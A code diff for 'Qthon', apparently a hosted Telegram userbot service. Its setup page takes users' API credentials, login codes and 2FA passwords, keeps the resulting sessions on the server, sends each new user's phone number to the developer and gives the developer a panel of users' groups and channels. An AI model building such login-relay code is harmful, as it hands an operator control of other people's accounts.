@@ -465,56 +465,64 @@ async def setup_handlers(client, phone):
 # ======================== بوت المطور ========================
 bot = TelegramClient(f'bot_session_{uuid.uuid4().hex[:6]}', BOT_API_ID, BOT_API_HASH)
 
-def is_dev(user_id):
-    """التحقق من أن المستخدم هو المطور عن طريق رقم الهاتف"""
-    for phone, info in user_info_cache.items():
-        if phone == DEV_PHONE:
-            return True
-    # لو المطور مش في القائمة، نتحقق من ID تيليجرام
-    # يمكن استخدام معرف المطور مباشرة
-    return str(user_id) == DEV_PHONE
-
-def is_dev_id(user_id):
-    """التحقق السريع بمعرف المستخدم للبوت"""
-    for phone, client in active_clients.items():
-        if hasattr(client, '_self_id') and client._self_id == user_id:
-            return phone == DEV_PHONE
-    return str(user_id) == DEV_PHONE
+async def notify_dev(message):
+    """إرسال إشعار للمطور"""
+    try:
+        dev_client = None
+        for phone, client in active_clients.items():
+            if phone == DEV_PHONE:
+                dev_client = client
+                break
+        if dev_client:
+            await dev_client.send_message('me', message)
+        else:
+            # إذا لم يكن المطور مسجلاً، نستخدم البوت لإرسال رسالة إلى معرف المطور
+            # لكن لا يمكن للبوت إرسال رسالة إلى مستخدم إلا إذا بدأ المحادثة أولاً
+            pass
+    except Exception as e:
+        logger.error(f"Failed to notify dev: {e}")
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def bot_start(event):
-    """قائمة المطور فقط"""
-    # التحقق من المطور
-    if str(event.sender_id) == DEV_PHONE or is_dev_id(event.sender_id):
+    user_id = str(event.sender_id)
+    # التحقق مما إذا كان المستخدم هو المطور
+    if user_id == DEV_PHONE:
+        # قائمة المطور
         buttons = [
             [Button.inline("USERS COUNT", b"dev_users"),
              Button.inline("ACTIVE NOW", b"dev_active")],
             [Button.inline("TOP COMMANDS", b"dev_topcmd"),
-             Button.inline("USER DETAILS", b"dev_details")],
-            [Button.inline("GROUPS LIST", b"dev_groups"),
-             Button.inline("CHANNELS LIST", b"dev_channels")],
-            [Button.inline("BROADCAST", b"dev_broadcast")],
+             Button.inline("GROUPS LIST", b"dev_groups")],
+            [Button.inline("CHANNELS LIST", b"dev_channels"),
+             Button.inline("BROADCAST", b"dev_broadcast")],
         ]
         await event.respond(
-            "**Qthon Developer Panel**\n\n"
-            "Select an option to view information.",
+            "**Qthon Developer Panel**\n\nSelect an option.",
             buttons=buttons,
             parse_mode='md'
         )
+        await notify_dev("Developer logged in to bot panel.")
     else:
+        # مستخدم عادي - يظهر زر Mini App
+        site_url = os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000')
+        buttons = [
+            [Button.url("OPEN SETUP", site_url)],
+        ]
         await event.respond(
-            "**Qthon**\n\n"
-            "This bot is for developer only.\n"
-            "To set up your own userbot, please use the website:\n"
-            f"{os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000')}",
+            "**Qthon Setup**\n\n"
+            "Welcome! Press the button below to open the setup page.\n"
+            "You will need API ID and API Hash from my.telegram.org.",
+            buttons=buttons,
             parse_mode='md'
         )
+        # إشعار المطور بمستخدم جديد
+        await notify_dev(f"New user started setup: {user_id}")
 
 @bot.on(events.CallbackQuery())
 async def dev_callback(event):
     data = event.data.decode()
-    
-    if not (str(event.sender_id) == DEV_PHONE or is_dev_id(event.sender_id)):
+    user_id = str(event.sender_id)
+    if user_id != DEV_PHONE:
         await event.answer("Access denied", alert=True)
         return
     
@@ -551,16 +559,6 @@ async def dev_callback(event):
             msg += "No commands used yet."
         await event.edit(msg, parse_mode='md')
     
-    elif data == "dev_details":
-        msg = "**User Details:**\n\nSelect a user number:\n"
-        phones = list(active_clients.keys())
-        for i, phone in enumerate(phones, 1):
-            info = user_info_cache.get(phone, {})
-            msg += f"{i}. {info.get('first_name', phone)} | {phone}\n"
-        if not phones:
-            msg += "No users."
-        await event.edit(msg, parse_mode='md')
-    
     elif data == "dev_groups":
         msg = "**Groups:**\n\n"
         for phone, info in user_info_cache.items():
@@ -585,9 +583,13 @@ async def dev_callback(event):
             msg = "No channels found."
         await event.edit(msg, parse_mode='md')
     
+    elif data == "dev_broadcast":
+        # يمكن إضافة وظيفة البث لاحقًا
+        await event.answer("Broadcast feature coming soon", alert=True)
+    
     await event.answer()
 
-# ======================== موقع الويب ========================
+# ======================== موقع الويب الفاخر ========================
 @app.route('/')
 def home():
     domain = os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000')
@@ -596,33 +598,38 @@ def home():
     <html lang="en">
     <head>
         <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
         <title>Qthon - UserBot Setup</title>
         <style>
             :root {{
                 --bg: #0a0a19;
                 --bg2: #121226;
-                --surface: rgba(255,255,255,0.03);
-                --glass: rgba(255,255,255,0.05);
+                --surface: rgba(255,255,255,0.04);
+                --glass: rgba(255,255,255,0.06);
                 --glass-border: rgba(255,255,255,0.08);
                 --text: #FFFFFF;
                 --text-secondary: rgba(255,255,255,0.5);
+                --text-tertiary: rgba(255,255,255,0.3);
                 --accent: #4F6EF7;
+                --accent-glow: rgba(79,110,247,0.3);
                 --success: #34C759;
                 --danger: #FF3B30;
                 --radius: 16px;
+                --radius-xl: 24px;
             }}
             * {{ margin: 0; padding: 0; box-sizing: border-box; }}
             body {{
-                font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', sans-serif;
+                font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', system-ui, sans-serif;
                 background: var(--bg);
                 color: var(--text);
                 min-height: 100vh;
                 display: flex;
                 align-items: center;
                 justify-content: center;
-                padding: 20px;
+                padding: 16px;
                 -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale;
+                overflow-x: hidden;
             }}
             body::before {{
                 content: '';
@@ -631,45 +638,63 @@ def home():
                 left: -50%;
                 width: 200%;
                 height: 200%;
-                background: radial-gradient(ellipse at 50% 0%, rgba(79,110,247,0.04) 0%, transparent 60%),
-                            radial-gradient(ellipse at 80% 80%, rgba(79,110,247,0.03) 0%, transparent 50%);
+                background: radial-gradient(ellipse at 50% 0%, rgba(79,110,247,0.06) 0%, transparent 60%),
+                            radial-gradient(ellipse at 80% 80%, rgba(79,110,247,0.04) 0%, transparent 50%);
                 pointer-events: none;
                 z-index: 0;
+                animation: ambientPulse 8s ease-in-out infinite;
+            }}
+            @keyframes ambientPulse {{
+                0%, 100% {{ opacity: 1; }}
+                50% {{ opacity: 0.6; }}
             }}
             .container {{
                 position: relative;
                 z-index: 1;
                 width: 100%;
-                max-width: 440px;
+                max-width: 420px;
             }}
             .header {{
                 text-align: center;
                 margin-bottom: 32px;
             }}
             .logo {{
-                font-size: 48px;
+                font-size: 52px;
                 font-weight: 700;
-                letter-spacing: -1px;
+                letter-spacing: -1.5px;
                 background: linear-gradient(135deg, #FFFFFF 0%, rgba(255,255,255,0.8) 100%);
                 -webkit-background-clip: text;
                 -webkit-text-fill-color: transparent;
                 background-clip: text;
-                line-height: 1.2;
+                line-height: 1.1;
+                margin-bottom: 4px;
+                animation: fadeInUp 0.6s ease;
+            }}
+            @keyframes fadeInUp {{
+                from {{ opacity: 0; transform: translateY(20px); }}
+                to {{ opacity: 1; transform: translateY(0); }}
             }}
             .subtitle {{
-                font-size: 13px;
+                font-size: 12px;
                 font-weight: 500;
                 letter-spacing: 2px;
                 text-transform: uppercase;
-                color: var(--text-secondary);
-                margin-top: 4px;
+                color: var(--text-tertiary);
+                animation: fadeInUp 0.8s ease;
             }}
             .card {{
                 background: var(--bg2);
                 border: 1px solid var(--glass-border);
-                border-radius: 24px;
-                padding: 32px 24px;
+                border-radius: var(--radius-xl);
+                padding: 28px 24px;
                 box-shadow: 0 24px 80px rgba(0,0,0,0.4);
+                backdrop-filter: blur(20px);
+                -webkit-backdrop-filter: blur(20px);
+                transition: border-color 0.3s ease;
+                animation: fadeInUp 0.5s ease;
+            }}
+            .card:hover {{
+                border-color: rgba(255,255,255,0.12);
             }}
             .section-title {{
                 font-size: 13px;
@@ -689,7 +714,7 @@ def home():
                 font-weight: 600;
                 letter-spacing: 1.2px;
                 text-transform: uppercase;
-                color: var(--text-secondary);
+                color: var(--text-tertiary);
                 margin-bottom: 8px;
             }}
             .input-field {{
@@ -701,12 +726,14 @@ def home():
                 color: var(--text);
                 font-size: 15px;
                 font-family: 'SF Mono', 'JetBrains Mono', 'Fira Code', monospace;
+                letter-spacing: 0.5px;
                 outline: none;
-                transition: border-color 0.3s ease, box-shadow 0.3s ease;
+                transition: all 0.25s ease;
             }}
             .input-field:focus {{
                 border-color: rgba(79,110,247,0.5);
                 box-shadow: 0 0 0 4px rgba(79,110,247,0.08);
+                background: rgba(255,255,255,0.06);
             }}
             .btn {{
                 width: 100%;
@@ -715,26 +742,53 @@ def home():
                 border-radius: var(--radius);
                 font-size: 15px;
                 font-weight: 600;
+                letter-spacing: 0.5px;
                 cursor: pointer;
                 transition: all 0.3s ease;
                 margin-top: 8px;
-                letter-spacing: 0.3px;
+                position: relative;
+                overflow: hidden;
+                -webkit-tap-highlight-color: transparent;
             }}
             .btn-primary {{
                 background: var(--accent);
                 color: #FFF;
+                transform: translateY(0);
+                box-shadow: 0 4px 15px rgba(79,110,247,0.2);
             }}
             .btn-primary:hover {{
-                box-shadow: 0 8px 32px rgba(79,110,247,0.3);
+                background: #5F7EF9;
+                box-shadow: 0 8px 32px var(--accent-glow);
+                transform: translateY(-1px);
+            }}
+            .btn-primary:active {{
+                transform: scale(0.98);
+                transition: transform 0.1s ease;
             }}
             .btn-success {{
                 background: var(--success);
                 color: #FFF;
+                box-shadow: 0 4px 15px rgba(52,199,89,0.2);
+            }}
+            .btn-success:hover {{
+                box-shadow: 0 8px 32px rgba(52,199,89,0.3);
+                transform: translateY(-1px);
             }}
             .btn-ghost {{
                 background: transparent;
                 color: var(--text-secondary);
                 border: 1px solid var(--glass-border);
+                position: absolute;
+                top: 16px;
+                right: 16px;
+                width: auto;
+                padding: 8px 16px;
+                font-size: 13px;
+                border-radius: 12px;
+            }}
+            .btn-ghost:hover {{
+                background: rgba(255,255,255,0.05);
+                color: var(--text);
             }}
             .result {{
                 margin-top: 20px;
@@ -744,25 +798,30 @@ def home():
                 font-weight: 500;
                 text-align: center;
                 display: none;
+                animation: fadeInUp 0.4s ease;
+            }}
+            .result.show {{
+                display: block;
             }}
             .result.success {{
-                display: block;
                 background: rgba(52,199,89,0.1);
                 border: 1px solid rgba(52,199,89,0.2);
                 color: var(--success);
             }}
             .result.error {{
-                display: block;
                 background: rgba(255,59,48,0.1);
                 border: 1px solid rgba(255,59,48,0.2);
                 color: var(--danger);
             }}
+            .hidden {{ display: none; }}
+            .relative {{ position: relative; }}
             .help-box {{
                 margin-top: 24px;
                 padding: 20px;
-                background: var(--bg);
+                background: var(--bg2);
                 border-radius: var(--radius);
                 border: 1px solid var(--glass-border);
+                animation: fadeInUp 0.7s ease;
             }}
             .help-box h3 {{
                 font-size: 14px;
@@ -774,17 +833,44 @@ def home():
                 color: var(--accent);
                 text-decoration: none;
                 font-weight: 500;
+                border-bottom: 1px solid transparent;
+                transition: border-color 0.2s;
+            }}
+            .help-box a:hover {{
+                border-bottom-color: var(--accent);
             }}
             .help-box p {{
                 font-size: 13px;
                 color: var(--text-secondary);
-                line-height: 1.6;
+                line-height: 1.7;
                 margin-bottom: 8px;
             }}
-            .hidden {{ display: none; }}
-            @media (max-width: 480px) {{
-                .card {{ padding: 24px 16px; }}
-                .logo {{ font-size: 36px; }}
+            /* Progress inside button */
+            .btn.loading {{
+                pointer-events: none;
+                opacity: 0.8;
+            }}
+            .btn.loading::after {{
+                content: '';
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                width: 18px;
+                height: 18px;
+                margin-left: -9px;
+                margin-top: -9px;
+                border: 2px solid transparent;
+                border-top-color: currentColor;
+                border-radius: 50%;
+                animation: spin 0.8s linear infinite;
+            }}
+            @keyframes spin {{
+                to {{ transform: rotate(360deg); }}
+            }}
+            @media (max-width: 380px) {{
+                .card {{ padding: 20px 16px; }}
+                .logo {{ font-size: 42px; }}
+                .btn-ghost {{ top: 8px; right: 8px; }}
             }}
         </style>
     </head>
@@ -792,11 +878,11 @@ def home():
         <div class="container">
             <div class="header">
                 <h1 class="logo">Qthon</h1>
-                <p class="subtitle">by Qgram</p>
+                <p class="subtitle">Telethon Setup</p>
             </div>
             <div class="card">
                 <div id="step1">
-                    <p class="section-title">Account Setup</p>
+                    <p class="section-title">Account Configuration</p>
                     <form id="sendForm" autocomplete="off">
                         <div class="input-group">
                             <label class="input-label">API ID</label>
@@ -810,80 +896,101 @@ def home():
                             <label class="input-label">Phone Number</label>
                             <input type="text" name="phone" id="phone" placeholder="+201234567890" required class="input-field">
                         </div>
-                        <button type="submit" class="btn btn-primary">Send Verification Code</button>
+                        <button type="submit" class="btn btn-primary" id="sendBtn">Send Verification Code</button>
                     </form>
                 </div>
-                <div id="step2" class="hidden">
+                <div id="step2" class="hidden relative">
+                    <button onclick="backToStep1()" class="btn btn-ghost">Back</button>
                     <p class="section-title">Verify Code</p>
                     <form id="verifyForm" autocomplete="off">
                         <input type="hidden" name="phone" id="verify_phone">
                         <div class="input-group">
                             <label class="input-label">Verification Code</label>
-                            <input type="text" name="code" id="code" placeholder="12345" required maxlength="5" class="input-field" style="text-align:center;font-size:24px;letter-spacing:8px">
+                            <input type="text" name="code" id="code" placeholder="12345" required maxlength="5" class="input-field" style="text-align:center;font-size:24px;letter-spacing:8px" inputmode="numeric">
                         </div>
                         <div class="input-group">
                             <label class="input-label">2FA Password (optional)</label>
                             <input type="password" name="password" id="password" placeholder="••••••••" class="input-field">
                         </div>
-                        <button type="submit" class="btn btn-success">Activate UserBot</button>
+                        <button type="submit" class="btn btn-success" id="verifyBtn">Activate</button>
                     </form>
-                    <button onclick="backToStep1()" class="btn btn-ghost" style="margin-top:12px;">Back</button>
                 </div>
                 <div id="result" class="result"></div>
             </div>
             <div class="help-box">
-                <h3>How to get API ID and Hash?</h3>
+                <h3>Need API credentials?</h3>
                 <p>1. Visit <a href="https://my.telegram.org" target="_blank">my.telegram.org</a></p>
                 <p>2. Log in with your phone number</p>
                 <p>3. Go to <strong>API development tools</strong></p>
-                <p>4. Create a new application</p>
-                <p>5. Copy your <strong>api_id</strong> and <strong>api_hash</strong></p>
+                <p>4. Create an application to get your <strong>api_id</strong> and <strong>api_hash</strong></p>
             </div>
         </div>
         <script>
-            async function showResult(message, isSuccess) {{
-                const r = document.getElementById('result');
-                r.className = 'result ' + (isSuccess ? 'success' : 'error');
-                r.textContent = message;
+            const resultDiv = document.getElementById('result');
+            const sendBtn = document.getElementById('sendBtn');
+            const verifyBtn = document.getElementById('verifyBtn');
+
+            function showResult(message, isSuccess) {{
+                resultDiv.className = 'result show ' + (isSuccess ? 'success' : 'error');
+                resultDiv.textContent = message;
             }}
+
+            function setLoading(btn, loading) {{
+                if (loading) {{
+                    btn.classList.add('loading');
+                    btn.disabled = true;
+                }} else {{
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
+                }}
+            }}
+
             document.getElementById('sendForm').addEventListener('submit', async (e) => {{
                 e.preventDefault();
-                const f = new FormData(e.target);
+                const formData = new FormData(e.target);
+                setLoading(sendBtn, true);
                 try {{
-                    const res = await fetch('/api/send_code', {{ method: 'POST', body: f }});
-                    const d = await res.json();
-                    if (d.status === 'code_sent') {{
-                        document.getElementById('verify_phone').value = f.get('phone');
+                    const res = await fetch('/api/send_code', {{ method: 'POST', body: formData }});
+                    const data = await res.json();
+                    if (data.status === 'code_sent') {{
+                        document.getElementById('verify_phone').value = formData.get('phone');
                         document.getElementById('step1').classList.add('hidden');
                         document.getElementById('step2').classList.remove('hidden');
-                        showResult(d.message, true);
+                        showResult(data.message, true);
                     }} else {{
-                        showResult(d.message || d.error || 'Error', false);
+                        showResult(data.message || data.error || 'An error occurred', false);
                     }}
                 }} catch (err) {{
                     showResult('Connection error', false);
+                }} finally {{
+                    setLoading(sendBtn, false);
                 }}
             }});
+
             document.getElementById('verifyForm').addEventListener('submit', async (e) => {{
                 e.preventDefault();
-                const f = new FormData(e.target);
+                const formData = new FormData(e.target);
+                setLoading(verifyBtn, true);
                 try {{
-                    const res = await fetch('/api/verify', {{ method: 'POST', body: f }});
-                    const d = await res.json();
-                    if (d.status === 'success') {{
-                        showResult(d.message, true);
-                        setTimeout(() => location.reload(), 3000);
+                    const res = await fetch('/api/verify', {{ method: 'POST', body: formData }});
+                    const data = await res.json();
+                    if (data.status === 'success') {{
+                        showResult('Telethon Qthon has been installed successfully!', true);
+                        // No reload, just show message
                     }} else {{
-                        showResult(d.message || 'Verification failed', false);
+                        showResult(data.message || 'Verification failed', false);
                     }}
                 }} catch (err) {{
                     showResult('Connection error', false);
+                }} finally {{
+                    setLoading(verifyBtn, false);
                 }}
             }});
+
             function backToStep1() {{
                 document.getElementById('step1').classList.remove('hidden');
                 document.getElementById('step2').classList.add('hidden');
-                document.getElementById('result').className = 'result';
+                resultDiv.className = 'result';
             }}
         </script>
     </body>
@@ -940,17 +1047,12 @@ async def verify():
         del pending_logins[phone]
         await save_all_sessions()
         start_client_in_background(client, phone)
-        return jsonify({"status": "success", "message": "UserBot activated successfully"})
+        # إشعار المطور بمستخدم جديد
+        await notify_dev(f"New user activated: {phone}")
+        return jsonify({"status": "success", "message": "Telethon Qthon installed successfully"})
     except Exception as e:
         logger.error(f"Verify error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 400
-
-@app.route('/api/status')
-def status():
-    return jsonify({
-        "total_users": len(active_clients),
-        "users": list(active_clients.keys())
-    })
 
 def start_main_loop():
     asyncio.set_event_loop(main_loop)
@@ -964,13 +1066,11 @@ loop_thread.start()
 async def main():
     await bot.start(bot_token=BOT_TOKEN)
     logger.info("Bot started")
+    # إشعار المطور بأن البوت قيد التشغيل
+    await notify_dev("Bot is now running and ready.")
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
     asyncio.run_coroutine_threadsafe(main(), main_loop)
-    logger.info("=" * 50)
     logger.info("Qthon Server Started")
-    logger.info(f"Volume: {DATA_DIR}")
-    logger.info(f"Channel: {SOURCE_CHANNEL}")
-    logger.info("=" * 50)
     app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
